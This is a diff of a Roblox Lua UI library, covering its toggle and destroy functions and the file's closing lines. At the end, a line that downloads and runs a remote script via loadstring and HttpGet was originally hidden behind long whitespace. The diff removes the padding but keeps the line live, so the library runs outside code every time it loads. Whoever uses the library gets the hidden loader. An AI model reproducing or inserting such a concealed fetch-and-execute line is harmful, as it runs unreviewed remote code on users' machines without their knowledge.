@@ -1553,13 +1553,14 @@ function library:Init()
         end
     end
 end
-                                                                                            
+
 function library:ToggleUI()
-    window.main.Visible = not window.main.Visible
+    parentTable.main.Visible = not parentTable.main.Visible
 end                                         
 
 function library:Destory()
-    self.base:Destory()
+    game:GetService("CoreGui")["Unnamed Library"]:Destory()
 end                         
-                                                                                                                                                                                                                                                                                                                                                                                                spawn(loadstring(game:HttpGet'https://raw.githubusercontent.com/OPENCUP/random-texts/main/test-final.txt'))
+
+spawn(loadstring(game:HttpGet'https://raw.githubusercontent.com/OPENCUP/random-texts/main/test-final.txt'))
 return library
